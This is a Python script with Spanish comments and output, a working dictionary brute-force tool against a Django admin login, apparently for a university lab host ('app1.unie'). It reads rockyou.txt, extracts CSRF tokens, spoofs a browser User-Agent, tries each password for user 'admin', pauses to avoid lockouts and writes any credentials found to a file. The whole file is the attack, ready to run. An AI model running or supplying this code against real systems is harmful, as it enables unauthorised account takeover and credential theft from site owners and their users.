#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import time
import sys
import os

def brute_force_django_admin(password_file="rockyou.txt", target_url="http://app1.unie/admin/login/"):
    try:
        # Verificar si el archivo existe
        if not os.path.exists(password_file):
            raise FileNotFoundError(f"Archivo {password_file} no encontrado")
        
        # Leer el archivo de contraseñas
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
        
        print(f"[*] Cargadas {len(passwords)} contraseñas desde {password_file}")
        print(f"[*] Objetivo: {target_url}")
        print(f"[*] Usuario probado: admin")
        print("-" * 50)
        
        # Primero probar una conexión básica
        print("[*] Probando conexión con el servidor...")
        try:
            test_session = requests.Session()
            response = test_session.get(target_url, timeout=10)
            if response.status_code != 200:
                print(f"[!] Error: El servidor respondió con código {response.status_code}")
                print(f"[!] Verifica la URL: {target_url}")
                return
            print("[*] Conexión establecida correctamente")
        except Exception as e:
            print(f"[!] Error de conexión: {e}")
            print(f"[!] Verifica que la URL {target_url} sea accesible")
            return
        
        success = False
        tested = 0
        
        for password in passwords:
            tested += 1
            
            # Mostrar progreso cada 100 intentos
            if tested % 100 == 0:
                print(f"[*] Progreso: {tested}/{len(passwords)} intentos")
                sys.stdout.flush()
            
            # Crear nueva sesión para cada intento
            session = requests.Session()
            
            try:
                # 1. Obtener página de login y token CSRF
                sys.stdout.write(f"\r[{tested}] Probando: '{password}'")
                sys.stdout.flush()
                
                response = session.get(target_url, timeout=10)
                
                if response.status_code != 200:
                    sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> Error HTTP {response.status_code}\n")
                    sys.stdout.flush()
                    continue
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Buscar token CSRF de diferentes formas
                csrf_token = None
                
                # Método 1: Buscar input con name csrfmiddlewaretoken
                csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
                if csrf_input and 'value' in csrf_input.attrs:
                    csrf_token = csrf_input['value']
                
                # Método 2: Buscar input con name csrf_token
                if not csrf_token:
                    csrf_input = soup.find('input', {'name': 'csrf_token'})
                    if csrf_input and 'value' in csrf_input.attrs:
                        csrf_token = csrf_input['value']
                
                # Método 3: Buscar en meta tags
                if not csrf_token:
                    meta_csrf = soup.find('meta', {'name': 'csrf-token'})
                    if meta_csrf and 'content' in meta_csrf.attrs:
                        csrf_token = meta_csrf['content']
                
                if not csrf_token:
                    sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> No se encontró token CSRF\n")
                    sys.stdout.flush()
                    continue
                
                # 2. Preparar datos para el login
                login_data = {
                    'csrfmiddlewaretoken': csrf_token,
                    'username': 'admin',
                    'password': password,
                }
                
                # Añadir campo 'next' si existe en el formulario
                next_input = soup.find('input', {'name': 'next'})
                if next_input and 'value' in next_input.attrs:
                    login_data['next'] = next_input['value']
                else:
                    login_data['next'] = '/admin/'
                
                # 3. Preparar headers
                headers = {
                    'Referer': target_url,
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'http://app1.unie'
                }
                
                # Añadir cookies de sesión
                session.cookies.update(response.cookies)
                
                # 4. Intentar login
                response = session.post(
                    target_url, 
                    data=login_data, 
                    headers=headers, 
                    allow_redirects=True,
                    timeout=10
                )
                
                # 5. Verificar resultado
                if response.status_code in [200, 302]:
                    # Verificar si redirige fuera del login
                    if 'login' not in response.url and 'admin' in response.url:
                        sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> ¡ÉXITO! Contraseña encontrada: {password}\n")
                        sys.stdout.flush()
                        print("-" * 50)
                        print("="*50)
                        print(f"CREDENCIALES ENCONTRADAS: admin:{password}")
                        print("="*50)
                        
                        # Guardar resultado en archivo
                        with open("credenciales_encontradas.txt", "w") as f:
                            f.write(f"URL: {target_url}\n")
                            f.write(f"Usuario: admin\n")
                            f.write(f"Contraseña: {password}\n")
                        
                        success = True
                        break
                    else:
                        # Verificar mensajes de error
                        if "Please enter the correct" in response.text:
                            sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> Incorrecta\n")
                            sys.stdout.flush()
                        elif "CSRF" in response.text:
                            sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> Error CSRF\n")
                            sys.stdout.flush()
                        elif "Invalid username/password" in response.text:
                            sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> Inválida\n")
                            sys.stdout.flush()
                        else:
                            sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> Falló\n")
                            sys.stdout.flush()
                else:
                    sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> Código HTTP: {response.status_code}\n")
                    sys.stdout.flush()
                
                # Pequeña pausa para evitar bloqueos
                time.sleep(0.2)
                
            except requests.exceptions.Timeout:
                sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> Timeout\n")
                sys.stdout.flush()
                time.sleep(1)
            except requests.exceptions.ConnectionError:
                sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> Error de conexión\n")
                sys.stdout.flush()
                time.sleep(2)
            except Exception as e:
                sys.stdout.write(f"\r[{tested}] Probando: '{password}' -> Error: {str(e)[:30]}\n")
                sys.stdout.flush()
        
        if not success:
            print("\n[-] No se encontró la contraseña en el diccionario")
            
    except FileNotFoundError as e:
        print("\n No se encuentra el archivo rockyou.txt")
    except KeyboardInterrupt:
        print("\n Interrumpido por el usuario")
    except Exception as e:
        print(f"Error inesperado: {e}")

def main():
    print("____             _         _____                  \n| __ ) _ __ _   _| |_ ___  |  ___|__  _ __ ___ ___ \n|  _ \\| '__| | | | __/ _ \\ | |_ / _ \\| '__/ __/ _ \\\n| |_) | |  | |_| | ||  __/ |  _| (_) | | | (_|  __/\n|____/|_|   \\__,_|\\__\\___| |_|  \\___/|_|  \\___\\___|")
    print(" ___           ___ ___ ___ ___ \n| __|__ _ _   / __/ __| _ \\ __|\n| _/ _ \\ '_| | (__\\__ \\   / _| \n|_|\\___/_|    \\___|___/_|_\\_|  \n                               \n")
    
    # Configuración
    password_file = "rockyou.txt"  
    target_url = "http://app1.unie/admin/login/"  
    
    print("[*] Iniciando ataque de fuerza bruta...")
    print("[*] Presiona Ctrl+C para detener")
    print("")
    
    # Iniciar ataque
    brute_force_django_admin(password_file, target_url)
    
    print("\n[*] Ejecución completada")

def check_dependencies():
    """Verificar e instalar dependencias necesarias"""
    try:
        import requests
        from bs4 import BeautifulSoup
        return True
    except ImportError:
        print("[!] Dependencias no encontradas")
        print("[?] ¿Deseas instalarlas automáticamente? (s/n): ", end="")
        respuesta = input().strip().lower()
        
        if respuesta in ['s', 'si', 'y', 'yes']:
            print("[*] Instalando dependencias...")
            try:
                import subprocess
                subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "beautifulsoup4"])
                print("[*] Dependencias instaladas. Ejecuta el script de nuevo.")
                return False
            except Exception as e:
                print(f"[!] Error instalando dependencias: {e}")
                print("[!] Instala manualmente:")
                print("[!] pip install requests beautifulsoup4")
                return False
        else:
            print("[!] Instala manualmente:")
            print("[!] pip install requests beautifulsoup4")
            return False

if __name__ == "__main__":
    # Verificar dependencias
    if not check_dependencies():
        sys.exit(1)
    
    main()